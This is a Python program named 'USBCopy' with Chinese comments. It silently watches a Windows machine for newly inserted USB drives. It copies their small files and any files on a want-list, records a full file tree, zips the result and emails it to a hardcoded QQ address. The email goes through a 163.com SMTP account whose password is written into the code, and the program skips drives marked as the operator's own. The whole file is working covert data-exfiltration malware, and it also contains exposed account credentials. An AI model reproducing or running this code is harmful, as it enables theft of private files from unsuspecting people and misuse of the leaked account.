from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from os import path
from os import remove
from os import mkdir
from os import listdir
from smtplib import SMTP
from shutil import make_archive
from shutil import rmtree
from time import sleep
from time import strftime
from time import time
from time import localtime
from email.mime.application import MIMEApplication
from threading import Thread
from psutil import disk_partitions
from os import walk
from datetime import datetime

targetRoot = 'D:\copyFile'  # 目标目录
oldDiskName = []  # 旧的磁盘列表
number = 0  # 磁盘数，判断是否为第一次运行
wantPath = 'D:\copyFile\wantList.txt'
wantList = []
version = '3.0'


def send_email(smtpHost, sendAddr, password, recipientAddrs, zipPath, subject='', content=''):
    msg = MIMEMultipart()
    msg['from'] = sendAddr
    msg['to'] = recipientAddrs
    msg['subject'] = subject

    zipPath = zipPath.replace("\\", "/")
    if path.getsize(zipPath) / 1048576 <= 20:
        part = MIMEApplication(open(zipPath, 'rb').read())
        part.add_header('Content-Disposition', 'attachment', filename=path.split(zipPath)[1])
        msg.attach(part)
        content = content

        remove(zipPath)
    else:
        content = '附件太大' + zipPath + '\t' + str(round(path.getsize(zipPath) / 1048576, 2))
    content += 'Copy By USBCopy %s' % version
    txt = MIMEText(content, 'plain', 'utf-8')
    msg.attach(txt)

    smtp = SMTP()
    smtp.connect(smtpHost, '25')
    smtp.login(sendAddr, password)
    smtp.sendmail(sendAddr, recipientAddrs, str(msg))
    write_log("发送成功！")
    smtp.quit()


def trySendEmail(zipPath):
    try:
        subject = 'USB_COPY'
        content = 'USB_COPY_FILE'
        send_email('smtp.163.com', 'czruby@163.com', 'VLHJWMNHAQUQEXKT', '3116878993@qq.com', zipPath, subject, content)
    except Exception as err:
        write_log(err)


'''
从sourcepath复制文件和目录到targetPath
'''


def copyfile(sourcePath, targetPath, threadName):
    for f in listdir(sourcePath):
        if (f == 'System Volume Information'):  # 过滤系统文件夹
            continue

        f1 = path.join(sourcePath, f)  # 连接源文件（目录）名
        f2 = path.join(targetPath, f)  # 连接目标文件（目录）名

        if path.isfile(f1):  # 如果为文件，则进行复制操作
            for w in wantList:
                if path.split(f1)[1] == w:
                    file1 = open(f1, 'rb')
                    file2 = open(f2, 'wb')
                    write_log(threadName + '-%s文件正在复制！' % (f1))
                    file2.write(file1.read())
                    write_log(threadName + '-%s文件复制成功！' % (f1))
                    wantList.remove(w)
                    if path.exists(wantPath):
                        wwantStr = ''
                        with open(wantPath, mode='w', encoding='utf-8') as f:
                            for w in wantList:
                                wwantStr += w + '\n'
                            wwantStr = wwantStr.strip()
                            if len(wantList) == 0:
                                wwantStr = ''
                            f.write(wwantStr)
                    continue
            size = path.getsize(f1) / 1048576
            if size >= 10:
                continue
            file1 = open(f1, 'rb')
            file2 = open(f2, 'wb')
            write_log(threadName + '-%s文件正在复制！' % (f1))
            file2.write(file1.read())
            write_log(threadName + '-%s文件复制成功！' % (f1))
        else:  # 如果为目录，创建新一级的目标目录，并递归操作
            write_log(threadName + '-%s目录正在复制！' % (f1))
            write_log(threadName + '-%s目标目录创建成功！' % (f2))
            mkdir(f2)
            copyfile(f1, f2, threadName)
            write_log(threadName + '-%s目录复制成功！' % (f1))


def write_log(text):
    """记录日志"""
    f = open('%s/USBcopy.log' % targetRoot, mode='a', encoding='utf-8')
    f.write(datetime.now().strftime('%Y-%m-%d %H:%M:%S' + "\t" + text + "\n"))
    f.close()


'''
获取磁盘信息，并与上次获取的信息进行比较，判断是否有新的磁盘添加进来
'''


def getDiskMessage():
    global oldDiskName  # 声明全局变量
    global number

    if number == 0:  # 第一次操作，先获取一遍磁盘数据，然后返回
        for disk in disk_partitions():
            number = number + 1
            oldDiskName.append(disk.device[:2])  # 获取盘符信息
        return

    newDiskName = []  # 保存新获取的磁盘信息
    for disk in disk_partitions():
        newDiskName.append(disk.device[:2])  # 获取新的磁盘信息

    newDiskList = arrayCompare(oldDiskName, newDiskName)  # 获取新增盘符列表

    oldDiskName.clear()  # 清除旧盘符列表
    oldDiskName = newDiskName[:]  # 复制新盘符列表给旧盘符列表
    return newDiskList


'''
比较两个磁盘盘符列表，并返回新盘符列表中旧盘符列表没有的盘符名列表
'''


def arrayCompare(oldDiskName, newDiskName):
    newDiskList = []
    for name in newDiskName:
        if name not in oldDiskName:  # 旧盘符中没有，则添加这个到新增盘符列表中
            newDiskList.append(name)
    return newDiskList


def makeZip(path):
    zipPath = make_archive(path, 'zip', path)  # 注意：压缩包名不用加扩展名
    rmtree(path)
    trySendEmail(zipPath)


def copyFileTree(treePath, targetPath):
    fileTreeStr = ''
    timeNow = str(strftime('%Y%m%d%H%M%S', localtime(time())))
    fileName = treePath + timeNow + '.txt'
    targetFilePath = targetPath + '\\' + fileName
    mypath = treePath + '://'
    for dirName, subdirList, fileList in walk(mypath):
        fileTreeStr = ''
        fileTreeStr += 'Folder: %s\n' % dirName
        for fname in fileList:
            fileTreeStr += '\t%s\t%s\n' % (fname, round((path.getsize(dirName + '\\' + fname) / 1048576), 2))
        with open(targetFilePath, mode='a') as f:
            f.write(fileTreeStr)
    fileTreeStr += '当前wantList:\n'
    for w in wantList:
        fileTreeStr += w + '\n'
    with open(targetFilePath, mode='a') as f:
        f.write(fileTreeStr)


'''
复制盘符name中的文件到目标目录中
'''


def copy(name, threadName):
    timeNow = str(strftime('%Y%m%d%H%M%S', localtime(time())))  # 获取当前时间字串
    targetPath = path.join(targetRoot, name[:1] + '_' + timeNow)  # 创建一个新目录，使用目标目录+盘符+时间作为名称，防止重复
    mkdir(targetPath)  # 创建新的目录
    copyFileTree(name[:1], targetPath)
    copyfile(name, targetPath, threadName)  # 复制文件
    write_log(threadName + '-新磁盘：%s盘 复制成功！' % (name[:1]))
    makeZip(targetPath)


def main():
    logPath = r'D:\copyFile\USBcopy.log'
    if not path.exists(targetRoot):
        mkdir(targetRoot)
    if path.exists(logPath):
        trySendEmail(logPath)
        remove(logPath)
    getDiskMessage()  # 获取初始数据
    threadCount = 0  # 线程计数
    while True:
        if path.exists(wantPath):
            with open(wantPath, mode='r', encoding='utf-8') as f:
                wantStr = f.read()
                global wantList
                wantList = wantStr.split("\n")
        newDiskList = getDiskMessage()  # 获取新数据
        for name in newDiskList:  # 根据新获取到的数据去复制文件
            write_log('新磁盘列表：' + str(newDiskList))
            if path.exists(name[:1] + ':/isMe'):
                continue
            thread = Thread(target=copy, args=(name, 'thread_' + str(threadCount),))  # 创建线程去复制指定磁盘
            thread.start()  # 开启线程
            write_log('thread_' + str(threadCount) + '-开始复制%s盘文件...' % (name[:1]))
            threadCount = threadCount + 1  # 线程计数+1
        sleep(10)  # 延时两秒进行下一次数据获取


if __name__ == '__main__':
    try:
        main()
    except Exception as error:
        write_log(error)
